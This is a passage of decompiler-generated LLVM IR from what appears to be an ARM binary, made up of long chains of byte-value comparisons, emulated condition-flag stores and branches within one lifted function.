dec_label_pc_f538:                                ; preds = %.thread267
  %v2_f538 = icmp ugt i32 %v1_e8ec, 62
  store i1 %v2_f538, i1* %cpsr_c.global-to-local, align 1
  %v7_f538 = icmp eq i32 %v1_e8ec, 63
  store i1 %v7_f538, i1* %cpsr_z.global-to-local, align 1
  %v2_f53c = xor i1 %v2_f538, true
  %v3_f53c = or i1 %v7_f538, %v2_f53c
  br i1 %v3_f53c, label %bb1625, label %bb1626

bb1625:                                           ; preds = %dec_label_pc_f538
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1626

bb1626:                                           ; preds = %dec_label_pc_f538, %bb1625
  %v0_f54c.pr905 = phi i32 [ %.2004, %dec_label_pc_f538 ], [ 0, %bb1625 ]
  %v2_f540 = xor i1 %v7_f538, true
  %v3_f540 = and i1 %v2_f538, %v2_f540
  br i1 %v3_f540, label %bb1627, label %bb1628

bb1627:                                           ; preds = %bb1626
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1628

bb1628:                                           ; preds = %bb1626, %bb1627
  %v0_f54c.pr = phi i32 [ %v0_f54c.pr905, %bb1626 ], [ 1, %bb1627 ]
  %v2_f544 = icmp ugt i32 %v1_e8ec, 125
  store i1 %v2_f544, i1* %cpsr_c.global-to-local, align 1
  %v7_f544 = icmp eq i32 %v1_e8ec, 126
  store i1 %v7_f544, i1* %cpsr_z.global-to-local, align 1
  %v2_f548 = xor i1 %v7_f544, true
  %v3_f548 = and i1 %v2_f544, %v2_f548
  br i1 %v3_f548, label %.thread272, label %bb1629

.thread272:                                       ; preds = %bb1628
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f554

bb1629:                                           ; preds = %bb1628
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f54c = icmp eq i32 %v0_f54c.pr, 0
  store i1 %v2_f54c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f54c, label %dec_label_pc_f554, label %dec_label_pc_e8d0

dec_label_pc_f554:                                ; preds = %.thread272, %.thread268, %bb1629, %.thread267
  store i32 %.2004, i32* %r3.global-to-local, align 4
  %v2_f558 = icmp ugt i32 %v1_e8e8, 210
  store i1 %v2_f558, i1* %cpsr_c.global-to-local, align 1
  %v7_f558 = icmp eq i32 %v1_e8e8, 211
  store i1 %v7_f558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f558, label %.thread275, label %.thread276

.thread276:                                       ; preds = %dec_label_pc_f554
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f588

.thread275:                                       ; preds = %dec_label_pc_f554
  store i32 %.2004, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f564 = icmp eq i1 %v7_edd4, false
  store i1 %v2_f564, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f564, label %dec_label_pc_f588, label %dec_label_pc_f56c

dec_label_pc_f56c:                                ; preds = %.thread275
  %v2_f56c = icmp ugt i32 %v1_e8ec, 94
  store i1 %v2_f56c, i1* %cpsr_c.global-to-local, align 1
  %v7_f56c = icmp eq i32 %v1_e8ec, 95
  store i1 %v7_f56c, i1* %cpsr_z.global-to-local, align 1
  %v2_f570 = xor i1 %v2_f56c, true
  %v3_f570 = or i1 %v7_f56c, %v2_f570
  br i1 %v3_f570, label %bb1630, label %bb1631

bb1630:                                           ; preds = %dec_label_pc_f56c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1631

bb1631:                                           ; preds = %dec_label_pc_f56c, %bb1630
  %v0_f580.pr908 = phi i32 [ %.2004, %dec_label_pc_f56c ], [ 0, %bb1630 ]
  %v2_f574 = xor i1 %v7_f56c, true
  %v3_f574 = and i1 %v2_f56c, %v2_f574
  br i1 %v3_f574, label %bb1632, label %bb1633

bb1632:                                           ; preds = %bb1631
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1633

bb1633:                                           ; preds = %bb1631, %bb1632
  %v0_f580.pr = phi i32 [ %v0_f580.pr908, %bb1631 ], [ 1, %bb1632 ]
  %v2_f578 = icmp ugt i32 %v1_e8ec, 125
  store i1 %v2_f578, i1* %cpsr_c.global-to-local, align 1
  %v7_f578 = icmp eq i32 %v1_e8ec, 126
  store i1 %v7_f578, i1* %cpsr_z.global-to-local, align 1
  %v2_f57c = xor i1 %v7_f578, true
  %v3_f57c = and i1 %v2_f578, %v2_f57c
  br i1 %v3_f57c, label %.thread280, label %bb1634

.thread280:                                       ; preds = %bb1633
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f588

bb1634:                                           ; preds = %bb1633
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f580 = icmp eq i32 %v0_f580.pr, 0
  store i1 %v2_f580, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f580, label %dec_label_pc_f588, label %dec_label_pc_e8d0

dec_label_pc_f588:                                ; preds = %.thread280, %.thread276, %bb1634, %.thread275
  store i32 %.1996, i32* %r3.global-to-local, align 4
  %v2_f58c = and i32 %.1979, %.1996
  %v4_f58c = icmp eq i32 %v2_f58c, 0
  store i1 %v4_f58c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f58c, label %dec_label_pc_f5a0, label %dec_label_pc_f594

dec_label_pc_f594:                                ; preds = %dec_label_pc_f588
  %v2_f594 = icmp eq i32 %v1_e8ec, 255
  store i1 %v2_f594, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f594, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f594, label %dec_label_pc_f5a0, label %bb1635

bb1635:                                           ; preds = %dec_label_pc_f594
  %v3_f598 = icmp ugt i32 %v1_e8ec, 190
  store i1 %v3_f598, i1* %cpsr_c.global-to-local, align 1
  %v8_f598 = icmp eq i32 %v1_e8ec, 191
  store i1 %v8_f598, i1* %cpsr_z.global-to-local, align 1
  %v2_f59c = xor i1 %v8_f598, true
  %v3_f59c = and i1 %v3_f598, %v2_f59c
  br i1 %v3_f59c, label %dec_label_pc_e8d0, label %dec_label_pc_f5a0

dec_label_pc_f5a0:                                ; preds = %dec_label_pc_f594, %bb1635, %dec_label_pc_f588
  %v7_f5a0 = icmp eq i32 %v1_e8d4, 37
  %.2023 = zext i1 %v7_f5a0 to i32
  store i32 %.2023, i32* @sl, align 4
  %v2_f5ac = icmp ugt i32 %v1_e8e8, 138
  store i1 %v2_f5ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f5ac = icmp eq i32 %v1_e8e8, 139
  store i1 %v7_f5ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5ac, label %bb1638, label %dec_label_pc_f5d0

bb1638:                                           ; preds = %dec_label_pc_f5a0
  %v2_f5a0 = icmp ugt i32 %v1_e8d4, 36
  store i1 %v2_f5a0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f5a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5a0, label %dec_label_pc_f5b8, label %dec_label_pc_f5d0

dec_label_pc_f5b8:                                ; preds = %bb1638
  store i32 %v1_e8ec, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f5b8 = icmp eq i32 %v1_e8ec, 0
  store i1 %v2_f5b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f5b8, label %bb1640, label %bb1639

bb1639:                                           ; preds = %dec_label_pc_f5b8
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1640

bb1640:                                           ; preds = %dec_label_pc_f5b8, %bb1639
  %v0_f5c8.pr = phi i32 [ 0, %dec_label_pc_f5b8 ], [ 1, %bb1639 ]
  %v2_f5c0 = icmp ugt i32 %v1_e8ec, 29
  store i1 %v2_f5c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f5c0 = icmp eq i32 %v1_e8ec, 30
  store i1 %v7_f5c0, i1* %cpsr_z.global-to-local, align 1
  %v2_f5c4 = xor i1 %v7_f5c0, true
  %v3_f5c4 = and i1 %v2_f5c0, %v2_f5c4
  br i1 %v3_f5c4, label %.thread286, label %bb1641

.thread286:                                       ; preds = %bb1640
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f5d0

bb1641:                                           ; preds = %bb1640
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f5c8 = icmp eq i32 %v0_f5c8.pr, 0
  store i1 %v2_f5c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f5c8, label %dec_label_pc_f5d0, label %dec_label_pc_e8d0

dec_label_pc_f5d0:                                ; preds = %dec_label_pc_f5a0, %.thread286, %bb1641, %bb1638
  %v0_f5fc.pr914 = phi i32 [ %.1996, %dec_label_pc_f5a0 ], [ 0, %.thread286 ], [ 0, %bb1641 ], [ %.1996, %bb1638 ]
  %v7_f5d0 = icmp eq i32 %v1_e8d4, 67
  %.2024 = zext i1 %v7_f5d0 to i32
  %v2_f5dc = icmp ugt i32 %v1_e8e8, 206
  store i1 %v2_f5dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f5dc = icmp eq i32 %v1_e8e8, 207
  store i1 %v7_f5dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5dc, label %bb1644, label %dec_label_pc_f604

bb1644:                                           ; preds = %dec_label_pc_f5d0
  %v2_f5d0 = icmp ugt i32 %v1_e8d4, 66
  store i1 %v2_f5d0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f5d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5d0, label %dec_label_pc_f5e8, label %dec_label_pc_f604

dec_label_pc_f5e8:                                ; preds = %bb1644
  %v2_f5e8 = icmp ugt i32 %v1_e8ec, 62
  store i1 %v2_f5e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f5e8 = icmp eq i32 %v1_e8ec, 63
  store i1 %v7_f5e8, i1* %cpsr_z.global-to-local, align 1
  %v2_f5ec = xor i1 %v2_f5e8, true
  %v3_f5ec = or i1 %v7_f5e8, %v2_f5ec
  br i1 %v3_f5ec, label %bb1645, label %bb1646

bb1645:                                           ; preds = %dec_label_pc_f5e8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1646

bb1646:                                           ; preds = %dec_label_pc_f5e8, %bb1645
  %v0_f5fc.pr913 = phi i32 [ %v0_f5fc.pr914, %dec_label_pc_f5e8 ], [ 0, %bb1645 ]
  %v2_f5f0 = xor i1 %v7_f5e8, true
  %v3_f5f0 = and i1 %v2_f5e8, %v2_f5f0
  br i1 %v3_f5f0, label %bb1647, label %bb1648

bb1647:                                           ; preds = %bb1646
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1648

bb1648:                                           ; preds = %bb1646, %bb1647
  %v0_f5fc.pr = phi i32 [ %v0_f5fc.pr913, %bb1646 ], [ 1, %bb1647 ]
  %v2_f5f4 = icmp ugt i32 %v1_e8ec, 93
  store i1 %v2_f5f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f5f4 = icmp eq i32 %v1_e8ec, 94
  store i1 %v7_f5f4, i1* %cpsr_z.global-to-local, align 1
  %v2_f5f8 = xor i1 %v7_f5f4, true
  %v3_f5f8 = and i1 %v2_f5f4, %v2_f5f8
  br i1 %v3_f5f8, label %.thread292, label %bb1649

.thread292:                                       ; preds = %bb1648
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f604

bb1649:                                           ; preds = %bb1648
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f5fc = icmp eq i32 %v0_f5fc.pr, 0
  store i1 %v2_f5fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f5fc, label %dec_label_pc_f604, label %dec_label_pc_e8d0

dec_label_pc_f604:                                ; preds = %dec_label_pc_f5d0, %.thread292, %bb1649, %bb1644
  %v2_f604 = icmp ugt i32 %v1_e8e8, 204
  store i1 %v2_f604, i1* %cpsr_c.global-to-local, align 1
  %v7_f604 = icmp eq i32 %v1_e8e8, 205
  store i1 %v7_f604, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f604, label %.thread295, label %.thread296

.thread296:                                       ; preds = %dec_label_pc_f604
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f62c

.thread295:                                       ; preds = %dec_label_pc_f604
  store i32 %.2024, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f610 = icmp eq i1 %v7_f5d0, false
  store i1 %v2_f610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f610, label %dec_label_pc_f62c, label %dec_label_pc_f618

dec_label_pc_f618:                                ; preds = %.thread295
  %v2_f618 = icmp ugt i32 %v1_e8ec, 189
  store i1 %v2_f618, i1* %cpsr_c.global-to-local, align 1
  %v7_f618 = icmp eq i32 %v1_e8ec, 190
  store i1 %v7_f618, i1* %cpsr_z.global-to-local, align 1
  %v2_f61c = xor i1 %v7_f618, true
  %v3_f61c = and i1 %v2_f618, %v2_f61c
  br i1 %v3_f61c, label %bb1650, label %bb1651

bb1650:                                           ; preds = %dec_label_pc_f618
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1651

bb1651:                                           ; preds = %dec_label_pc_f618, %bb1650
  %v0_f624917 = phi i32 [ %.2024, %dec_label_pc_f618 ], [ 0, %bb1650 ]
  %v2_f620 = xor i1 %v2_f618, true
  %v3_f620 = or i1 %v7_f618, %v2_f620
  br i1 %v3_f620, label %bb1652, label %bb1653

bb1652:                                           ; preds = %bb1651
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1653

bb1653:                                           ; preds = %bb1651, %bb1652
  %v0_f624 = phi i32 [ %v0_f624917, %bb1651 ], [ 1, %bb1652 ]
  %v2_f624 = and i32 %v3_e8dc, 64
  %v3_f624 = icmp ne i32 %v2_f624, 0
  store i1 %v3_f624, i1* %cpsr_c.global-to-local, align 1
  %v4_f624 = udiv i32 %v1_e8ec, 128
  %v5_f624 = and i32 %v0_f624, %v4_f624
  store i32 %v5_f624, i32* %r3.global-to-local, align 4
  %v6_f624 = icmp eq i32 %v5_f624, 0
  store i1 %v6_f624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_f624, label %dec_label_pc_f62c, label %dec_label_pc_e8d0

dec_label_pc_f62c:                                ; preds = %.thread296, %bb1653, %.thread295
  store i32 %.1999, i32* %r3.global-to-local, align 4
  %v2_f630 = icmp ugt i32 %v1_e8e8, 239
  store i1 %v2_f630, i1* %cpsr_c.global-to-local, align 1
  %v7_f630 = icmp eq i32 %v1_e8e8, 240
  store i1 %v7_f630, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f630, label %.thread299, label %.thread300

.thread300:                                       ; preds = %dec_label_pc_f62c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f658

.thread299:                                       ; preds = %dec_label_pc_f62c
  store i32 %.1999, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f63c = icmp eq i1 %v7_ece0, false
  store i1 %v2_f63c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f63c, label %dec_label_pc_f658, label %dec_label_pc_f644

dec_label_pc_f644:                                ; preds = %.thread299
  %v2_f644 = icmp ugt i32 %v1_e8ec, 141
  store i1 %v2_f644, i1* %cpsr_c.global-to-local, align 1
  %v7_f644 = icmp eq i32 %v1_e8ec, 142
  store i1 %v7_f644, i1* %cpsr_z.global-to-local, align 1
  %v2_f648 = xor i1 %v7_f644, true
  %v3_f648 = and i1 %v2_f644, %v2_f648
  br i1 %v3_f648, label %bb1654, label %bb1655

bb1654:                                           ; preds = %dec_label_pc_f644
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1655

bb1655:                                           ; preds = %dec_label_pc_f644, %bb1654
  %v0_f650920 = phi i32 [ %.1999, %dec_label_pc_f644 ], [ 0, %bb1654 ]
  %v2_f64c = xor i1 %v2_f644, true
  %v3_f64c = or i1 %v7_f644, %v2_f64c
  br i1 %v3_f64c, label %bb1656, label %bb1657

bb1656:                                           ; preds = %bb1655
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1657

bb1657:                                           ; preds = %bb1655, %bb1656
  %v0_f650 = phi i32 [ %v0_f650920, %bb1655 ], [ 1, %bb1656 ]
  %v2_f650 = and i32 %v3_e8dc, 64
  %v3_f650 = icmp ne i32 %v2_f650, 0
  store i1 %v3_f650, i1* %cpsr_c.global-to-local, align 1
  %v4_f650 = udiv i32 %v1_e8ec, 128
  %v5_f650 = and i32 %v0_f650, %v4_f650
  store i32 %v5_f650, i32* %r3.global-to-local, align 4
  %v6_f650 = icmp eq i32 %v5_f650, 0
  store i1 %v6_f650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_f650, label %dec_label_pc_f658, label %dec_label_pc_e8d0

dec_label_pc_f658:                                ; preds = %.thread300, %bb1657, %.thread299
  store i32 %.1984, i32* %r3.global-to-local, align 4
  %v2_f65c = icmp ugt i32 %v1_e8d4, 81
  store i1 %v2_f65c, i1* %cpsr_c.global-to-local, align 1
  %v7_f65c = icmp eq i32 %v1_e8d4, 82
  store i1 %v7_f65c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f65c, label %.thread303, label %.thread304

.thread304:                                       ; preds = %dec_label_pc_f658
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f688

.thread303:                                       ; preds = %dec_label_pc_f658
  store i32 %.1984, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f668 = icmp eq i1 %v7_eaa8, false
  store i1 %v2_f668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f668, label %dec_label_pc_f688, label %dec_label_pc_f670

dec_label_pc_f670:                                ; preds = %.thread303
  store i32 %v1_e8ec, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f670 = icmp eq i32 %v1_e8ec, 0
  store i1 %v2_f670, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f670, label %bb1659, label %bb1658

bb1658:                                           ; preds = %dec_label_pc_f670
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1659

bb1659:                                           ; preds = %dec_label_pc_f670, %bb1658
  %v0_f680.pr = phi i32 [ 0, %dec_label_pc_f670 ], [ 1, %bb1658 ]
  %v2_f678 = icmp ugt i32 %v1_e8ec, 13
  store i1 %v2_f678, i1* %cpsr_c.global-to-local, align 1
  %v7_f678 = icmp eq i32 %v1_e8ec, 14
  store i1 %v7_f678, i1* %cpsr_z.global-to-local, align 1
  %v2_f67c = xor i1 %v7_f678, true
  %v3_f67c = and i1 %v2_f678, %v2_f67c
  br i1 %v3_f67c, label %.thread308, label %bb1660

.thread308:                                       ; preds = %bb1659
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f688

bb1660:                                           ; preds = %bb1659
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f680 = icmp eq i32 %v0_f680.pr, 0
  store i1 %v2_f680, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f680, label %dec_label_pc_f688, label %dec_label_pc_e8d0

dec_label_pc_f688:                                ; preds = %.thread308, %.thread304, %bb1660, %.thread303
  store i32 %.1993, i32* %r3.global-to-local, align 4
  %v2_f68c = icmp ugt i32 %v1_e8d4, 94
  store i1 %v2_f68c, i1* %cpsr_c.global-to-local, align 1
  %v7_f68c = icmp eq i32 %v1_e8d4, 95
  store i1 %v7_f68c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f68c, label %.thread311, label %.thread312

.thread312:                                       ; preds = %dec_label_pc_f688
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f6bc

.thread311:                                       ; preds = %dec_label_pc_f688
  store i32 %.1993, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f698 = icmp eq i1 %v7_ec24, false
  store i1 %v2_f698, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f698, label %dec_label_pc_f6bc, label %dec_label_pc_f6a0

dec_label_pc_f6a0:                                ; preds = %.thread311
  %v2_f6a0 = icmp ugt i32 %v1_e8ec, 6
  store i1 %v2_f6a0, i1* %cpsr_c.global-to-local, align 1
  %v7_f6a0 = icmp eq i32 %v1_e8ec, 7
  store i1 %v7_f6a0, i1* %cpsr_z.global-to-local, align 1
  %v2_f6a4 = xor i1 %v2_f6a0, true
  %v3_f6a4 = or i1 %v7_f6a0, %v2_f6a4
  br i1 %v3_f6a4, label %bb1661, label %bb1662

bb1661:                                           ; preds = %dec_label_pc_f6a0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1662

bb1662:                                           ; preds = %dec_label_pc_f6a0, %bb1661
  %v0_f6b4.pr925 = phi i32 [ %.1993, %dec_label_pc_f6a0 ], [ 0, %bb1661 ]
  %v2_f6a8 = xor i1 %v7_f6a0, true
  %v3_f6a8 = and i1 %v2_f6a0, %v2_f6a8
  br i1 %v3_f6a8, label %bb1663, label %bb1664

bb1663:                                           ; preds = %bb1662
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1664

bb1664:                                           ; preds = %bb1662, %bb1663
  %v0_f6b4.pr = phi i32 [ %v0_f6b4.pr925, %bb1662 ], [ 1, %bb1663 ]
  %v2_f6ac = icmp ugt i32 %v1_e8ec, 61
  store i1 %v2_f6ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f6ac = icmp eq i32 %v1_e8ec, 62
  store i1 %v7_f6ac, i1* %cpsr_z.global-to-local, align 1
  %v2_f6b0 = xor i1 %v7_f6ac, true
  %v3_f6b0 = and i1 %v2_f6ac, %v2_f6b0
  br i1 %v3_f6b0, label %.thread316, label %bb1665

.thread316:                                       ; preds = %bb1664
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f6bc

bb1665:                                           ; preds = %bb1664
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6b4 = icmp eq i32 %v0_f6b4.pr, 0
  store i1 %v2_f6b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6b4, label %dec_label_pc_f6bc, label %dec_label_pc_e8d0

dec_label_pc_f6bc:                                ; preds = %.thread316, %.thread312, %bb1665, %.thread311
  store i1 %v2_f088, i1* %cpsr_c.global-to-local, align 1
  %.2025 = zext i1 %v7_f088 to i32
  store i32 %.2025, i32* %r4.global-to-local, align 4
  %v2_f6cc = and i32 %.2025, %.2001
  %v4_f6cc = icmp eq i32 %v2_f6cc, 0
  store i1 %v4_f6cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f6cc, label %dec_label_pc_f6f0, label %dec_label_pc_f6d4

dec_label_pc_f6d4:                                ; preds = %dec_label_pc_f6bc
  %v2_f6d4 = icmp ugt i32 %v1_e8ec, 30
  store i1 %v2_f6d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f6d4 = icmp eq i32 %v1_e8ec, 31
  store i1 %v7_f6d4, i1* %cpsr_z.global-to-local, align 1
  %v2_f6d8 = xor i1 %v2_f6d4, true
  %v3_f6d8 = or i1 %v7_f6d4, %v2_f6d8
  br i1 %v3_f6d8, label %bb1668, label %bb1669

bb1668:                                           ; preds = %dec_label_pc_f6d4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1669

bb1669:                                           ; preds = %dec_label_pc_f6d4, %bb1668
  %v2_f6dc = xor i1 %v7_f6d4, true
  %v3_f6dc = and i1 %v2_f6d4, %v2_f6dc
  br i1 %v3_f6dc, label %bb1670, label %bb1671

bb1670:                                           ; preds = %bb1669
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1671

bb1671:                                           ; preds = %bb1669, %bb1670
  %v0_f6e8.pr = phi i32 [ 0, %bb1669 ], [ 1, %bb1670 ]
  %v2_f6e0 = icmp ugt i32 %v1_e8ec, 41
  store i1 %v2_f6e0, i1* %cpsr_c.global-to-local, align 1
  %v7_f6e0 = icmp eq i32 %v1_e8ec, 42
  store i1 %v7_f6e0, i1* %cpsr_z.global-to-local, align 1
  %v2_f6e4 = xor i1 %v7_f6e0, true
  %v3_f6e4 = and i1 %v2_f6e0, %v2_f6e4
  br i1 %v3_f6e4, label %.thread321, label %bb1672

.thread321:                                       ; preds = %bb1671
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f6f0

bb1672:                                           ; preds = %bb1671
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6e8 = icmp eq i32 %v0_f6e8.pr, 0
  store i1 %v2_f6e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6e8, label %dec_label_pc_f6f0, label %dec_label_pc_e8d0

dec_label_pc_f6f0:                                ; preds = %.thread321, %bb1672, %dec_label_pc_f6bc
  %v7_f6f0 = icmp eq i32 %v1_e8d4, 185
  %.2026 = zext i1 %v7_f6f0 to i32
  %v2_f6fc = icmp ugt i32 %v1_e8e8, 91
  store i1 %v2_f6fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f6fc = icmp eq i32 %v1_e8e8, 92
  store i1 %v7_f6fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6fc, label %bb1675, label %dec_label_pc_f724

bb1675:                                           ; preds = %dec_label_pc_f6f0
  %v2_f6f0 = icmp ugt i32 %v1_e8d4, 184
  store i1 %v2_f6f0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f6f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6f0, label %dec_label_pc_f708, label %dec_label_pc_f724

dec_label_pc_f708:                                ; preds = %bb1675
  %v2_f708 = icmp ugt i32 %v1_e8ec, 218
  store i1 %v2_f708, i1* %cpsr_c.global-to-local, align 1
  %v7_f708 = icmp eq i32 %v1_e8ec, 219
  store i1 %v7_f708, i1* %cpsr_z.global-to-local, align 1
  %v2_f70c = xor i1 %v2_f708, true
  %v3_f70c = or i1 %v7_f708, %v2_f70c
  br i1 %v3_f70c, label %bb1676, label %bb1677

bb1676:                                           ; preds = %dec_label_pc_f708
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1677

bb1677:                                           ; preds = %dec_label_pc_f708, %bb1676
  %v2_f710 = xor i1 %v7_f708, true
  %v3_f710 = and i1 %v2_f708, %v2_f710
  br i1 %v3_f710, label %bb1678, label %bb1679

bb1678:                                           ; preds = %bb1677
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1679

bb1679:                                           ; preds = %bb1677, %bb1678
  %v0_f71c.pr = phi i32 [ 0, %bb1677 ], [ 1, %bb1678 ]
  %v2_f714 = icmp ugt i32 %v1_e8ec, 221
  store i1 %v2_f714, i1* %cpsr_c.global-to-local, align 1
  %v7_f714 = icmp eq i32 %v1_e8ec, 222
  store i1 %v7_f714, i1* %cpsr_z.global-to-local, align 1
  %v2_f718 = xor i1 %v7_f714, true
  %v3_f718 = and i1 %v2_f714, %v2_f718
  br i1 %v3_f718, label %.thread327, label %bb1680

.thread327:                                       ; preds = %bb1679
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f724

bb1680:                                           ; preds = %bb1679
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f71c = icmp eq i32 %v0_f71c.pr, 0
  store i1 %v2_f71c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f71c, label %dec_label_pc_f724, label %dec_label_pc_e8d0

dec_label_pc_f724:                                ; preds = %dec_label_pc_f6f0, %.thread327, %bb1680, %bb1675
  store i32 %.2017, i32* %r3.global-to-local, align 4
  %v2_f728 = icmp ugt i32 %v1_e8e8, 237
  store i1 %v2_f728, i1* %cpsr_c.global-to-local, align 1
  %v7_f728 = icmp eq i32 %v1_e8e8, 238
  store i1 %v7_f728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f728, label %.thread330, label %.thread331

.thread331:                                       ; preds = %dec_label_pc_f724
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f750

.thread330:                                       ; preds = %dec_label_pc_f724
  store i32 %.2017, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f734 = icmp eq i1 %v7_f32c, false
  store i1 %v2_f734, i1* %cpsr_z.global-to-local, align 1
